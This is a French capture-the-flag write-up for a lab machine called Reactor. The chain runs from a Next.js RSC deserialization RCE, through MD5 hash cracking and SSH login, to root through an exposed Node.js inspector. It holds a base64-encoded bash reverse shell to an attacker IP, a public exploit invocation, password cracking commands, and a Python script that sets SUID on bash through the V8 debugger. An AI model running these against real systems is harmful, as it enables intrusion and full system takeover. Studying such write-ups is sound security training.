[⬅ Retour à Machines](README.md) · [🏠 Accueil du repo](../../README.md)

# Machine — Reactor

**CVE-2025-55182 (React2Shell) + SQLite MD5 crack + Node.js --inspect RCE — Easy Linux**

## Concept

Une application Next.js 15.0.3 / React 19.0.0 (ReactorWatch) est vulnérable à CVE-2025-55182, une désérialisation non sécurisée dans le protocole React Server Components "Flight" permettant un RCE non authentifié. Le foothold donne accès en tant que `node`. Une base SQLite contient des hashes MD5 craquables qui donnent les credentials SSH de l'utilisateur `engineer`. La privesc abuse d'un service Node.js root lancé avec le flag `--inspect`, exposant un endpoint WebSocket du débogueur V8 sur localhost, permettant d'exécuter du JavaScript arbitraire en tant que root.

```mermaid
flowchart LR
    A["nmap -sC -sV"] --> B["Port 22: SSH\nPort 3000: Next.js 15.0.3"]
    B --> C["CVE-2025-55182\nReact2Shell RCE"]
    C --> D["Shell: node\n/opt/reactor-app"]
    D --> E["cat .env\nDB_PATH=reactor.db"]
    E --> F["sqlite3 reactor.db\nSELECT * FROM users"]
    F --> G["MD5 hash engineer\ncrack → reactor1"]
    G --> H["ssh engineer@reactor\nuser flag"]
    H --> I["ss -tnlp\nport 9229 localhost"]
    I --> J["--inspect=127.0.0.1:9229\nuptime-monitor.service (root)"]
    J --> K["SSH tunnel\nRuntime.evaluate WebSocket"]
    K --> L["chmod u+s /bin/bash\n/bin/bash -p → root"]
```



## Énumération

### Nmap

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.166.220 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.166.220
```

Ports ouverts : **22 (SSH)**, **3000 (HTTP Next.js)** — header `X-Powered-By: Next.js`.

```bash
echo "10.129.166.220 reactor.htb" | sudo tee -a /etc/hosts
```

---

## Foothold — CVE-2025-55182 (React2Shell)

CVE-2025-55182 est une désérialisation non sécurisée dans le protocole "Flight" de React Server Components. Affecte React 19.0.0–19.2.0 et Next.js 15.x/16.x avec l'App Router. CVSS 10.0.

```bash
git clone https://github.com/surajhacx/react2shellpoc.git
cd react2shellpoc

# Vérification RCE
python3 exploit.py -t http://reactor.htb:3000 -c "id"
# uid=999(node) gid=988(node) groups=988(node)
```

### Reverse shell

```bash
# Encoder le payload pour éviter les problèmes de caractères spéciaux
echo "bash -i >& /dev/tcp/10.10.16.47/4444 0>&1" | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Ny80NDQ0IDA+JjEK

# Listener
nc -lnvp 4444

# Exploit
python3 exploit.py -t http://reactor.htb:3000 -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Ny80NDQ0IDA+JjEK | base64 -d | bash"
```

### Stabilisation du shell

```bash
script /dev/null -c bash
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## Mouvement latéral — SQLite + MD5 crack

```bash
# Lecture du .env
cat /opt/reactor-app/.env
# DB_PATH=/opt/reactor-app/reactor.db
# DB_TYPE=sqlite3

# Dump des utilisateurs
sqlite3 /opt/reactor-app/reactor.db "SELECT * FROM users;"
# 1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
# 2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

### Crack des hashes MD5

```bash
# Avec john (si hashcat sans GPU)
echo "a203b22191d744a4e70ada5c101b17b8
39d97110eafe2a9a68639812cd271e8e" > hashes.txt

john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
# 39d97110eafe2a9a68639812cd271e8e → reactor1
```

### SSH

```bash
ssh engineer@reactor.htb
# Password: reactor1
cat /home/engineer/user.txt
```

**User flag** : `/home/engineer/user.txt` ✅

---

## Privilege Escalation — Node.js --inspect (V8 Debugger)

### Découverte

```bash
ss -tnlp
# LISTEN 0 511 127.0.0.1:9229 0.0.0.0:*

grep -rn 9229 /etc/systemd/system/ 2>/dev/null
# ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Le service `uptime-monitor` tourne en **root** avec le flag `--inspect`, exposant le débogueur V8 sur le port 9229 en local. Ce port accepte des connexions WebSocket et permet d'exécuter du JavaScript arbitraire dans le contexte du processus — ici en tant que root.

### Exploitation

#### 1. Tunnel SSH

```bash
# Depuis Kali
ssh -L 9229:127.0.0.1:9229 engineer@reactor.htb
```

#### 2. Récupérer l'UUID WebSocket

```bash
curl http://127.0.0.1:9229/json
# "webSocketDebuggerUrl": "ws://127.0.0.1:9229/<UUID>"
```

#### 3. Script d'exploitation

```python
# pwn.py
import json, sys, websocket
ws = websocket.create_connection(sys.argv[1])
ws.send(json.dumps({
    "id": 1,
    "method": "Runtime.evaluate",
    "params": {
        "expression": "process.mainModule.require('child_process').execSync('chmod u+s /bin/bash').toString()"
    }
}))
print(ws.recv())
```

```bash
pip install websocket-client --break-system-packages
python3 pwn.py "ws://127.0.0.1:9229/<UUID>"
# {"id":1,"result":{"result":{"type":"string","value":""}}}
```

#### 4. Shell root

```bash
/bin/bash -p
# euid=0(root)
cat /root/root.txt
```

**Root flag** : `/root/root.txt` ✅

---

## Résumé des credentials

| Service | Utilisateur | Mot de passe |
|---------|-------------|--------------|
| SSH | engineer | reactor1 |
| SSH | root | SUID bash via Node inspector |

## Vulnérabilités exploitées

| CVE / Technique | Description |
|----------------|-------------|
| CVE-2025-55182 | React Server Components — désérialisation non sécurisée du protocole "Flight" → RCE non authentifié |
| MD5 unsalted | Hashes MD5 sans sel dans SQLite → craquables avec rockyou.txt |
| Node.js `--inspect` | Débogueur V8 exposé en local sur un service root → RCE via `Runtime.evaluate` WebSocket |
